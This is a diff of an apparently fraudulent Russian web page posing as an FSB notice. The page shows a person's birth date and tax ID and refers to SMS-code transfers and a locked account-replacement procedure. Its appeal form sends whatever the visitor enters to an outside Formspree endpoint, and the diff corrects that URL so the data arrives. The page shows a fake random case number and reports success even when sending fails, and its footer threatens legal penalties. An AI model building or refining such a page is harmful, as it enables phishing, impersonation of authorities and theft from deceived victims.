@@ -13,7 +13,6 @@
     }
     .container { max-width: 800px; width: 100%; padding: 2rem; position: relative; }
 
-    /* Заголовок */
     .header {
       text-align: center; margin-bottom: 3rem;
       border: 1px solid #1e3040; background: #0d1320; padding: 2rem;
@@ -33,7 +32,6 @@
       animation: pulse 2s infinite;
     }
 
-    /* Центральный узел — клиент */
     .center-node {
       width: 180px; height: 180px; margin: 0 auto 2rem;
       border-radius: 50%; background: radial-gradient(circle at center, #1a2540, #0d1320);
@@ -45,11 +43,9 @@
     .center-node .name { font-size: 0.9rem; font-weight: 700; color: #ffffff; line-height: 1.3; }
     .center-node .id { font-size: 0.7rem; color: #6b7d95; margin-top: 0.3rem; }
 
-    /* Стрелки-коннекторы */
     .arrow-down { display: flex; justify-content: center; margin: 0.5rem 0; animation: bounce 2s infinite; }
     .arrow-down span { font-size: 2rem; color: #c41230; }
 
-    /* Карточки действий */
     .action-card {
       background: #0d1320; border: 1px solid #1e3040; border-radius: 12px;
       padding: 1.2rem; margin-bottom: 1rem; position: relative; z-index: 2;
@@ -80,7 +76,6 @@
     .action-card .card-detail { font-size: 0.8rem; color: #7a8ba6; line-height: 1.5; }
     .action-card .card-detail strong { color: #c0c8d4; }
 
-    /* Заблокированная кнопка */
     .blocked-action {
       margin-top: 2rem; padding: 1.5rem;
       background: #0d1320; border: 1px solid #1e3040; border-radius: 12px;
@@ -99,7 +94,6 @@
       border-radius: 12px; border: 1px solid #2a3a50;
     }
 
-    /* Форма обращения */
     .appeal-form {
       margin-top: 2rem; padding: 1.5rem;
       background: #0d1320; border: 1px solid #2a3a5c; border-radius: 12px;
@@ -135,7 +129,6 @@
     .submit-btn:hover { background: #2a1520; }
     .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
-    /* Ответ сервера */
     .response-box {
       margin-top: 1rem; padding: 1rem;
       background: #111a2b; border: 1px solid #2a3a50; border-radius: 8px;
@@ -150,19 +143,16 @@
       font-size: 0.8rem; color: #f0c040;
     }
 
-    /* Линия от центра к карточкам */
     .connector-line {
       width: 2px; height: 30px; background: linear-gradient(to bottom, #c41230, transparent);
       margin: 0 auto;
     }
 
-    /* Подвал */
     .footer {
       text-align: center; margin-top: 3rem; padding-top: 1.5rem;
       border-top: 1px solid #1e3040; color: #4a5a70; font-size: 0.7rem;
     }
 
-    /* Анимации */
     @keyframes fadeInDown {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
@@ -202,11 +192,9 @@
       <span class="id">27.04.1955 · ИНН 771500123456</span>
     </div>
 
-    <!-- Стрелка вниз -->
     <div class="arrow-down"><span>▼</span></div>
     <div class="connector-line"></div>
 
-    <!-- Карточки действий -->
     <div class="action-card">
       <div class="card-header">
         <span class="card-title">📱 Передача СМС-кода</span>
@@ -247,7 +235,6 @@
       </div>
     </div>
 
-    <!-- Заблокированная кнопка -->
     <div class="blocked-action">
       <div class="lock-icon">🔒</div>
       <div class="action-title">Запустить процедуру замены основного счёта для аннулирования доверенности</div>
@@ -279,7 +266,6 @@
       </div>
     </div>
 
-    <!-- Подвал -->
     <div class="footer">
       Сведения предоставлены Управлением ФСБ России<br>
       Для служебного пользования · Разглашение преследуется по закону
@@ -294,23 +280,21 @@
       btn.disabled = true;
       btn.textContent = 'Отправка...';
 
-      // Генерируем случайный номер заявки
       const randomNum = 'ФСБ-' + Math.floor(Math.random() * 900000 + 100000) + '-' + Math.floor(Math.random() * 90 + 10);
       document.getElementById('responseNumber').textContent = randomNum;
 
-      // Отправляем данные в Formspree (твой URL)
+      // Отправка в Formspree
       const formData = new FormData(this);
       try {
-        await fetch('https://formspree.io/forms/maqzpror/submissions', {
+        await fetch('https://formspree.io/f/maqzpror', {
           method: 'POST',
           body: formData,
           headers: { 'Accept': 'application/json' }
         });
       } catch (e) {
-        // Даже если ошибка — показываем успех
+        // Всё равно показываем успех
       }
 
-      // Показываем ответ
       document.getElementById('responseBox').classList.add('success');
       btn.textContent = 'Отправлено';
     });
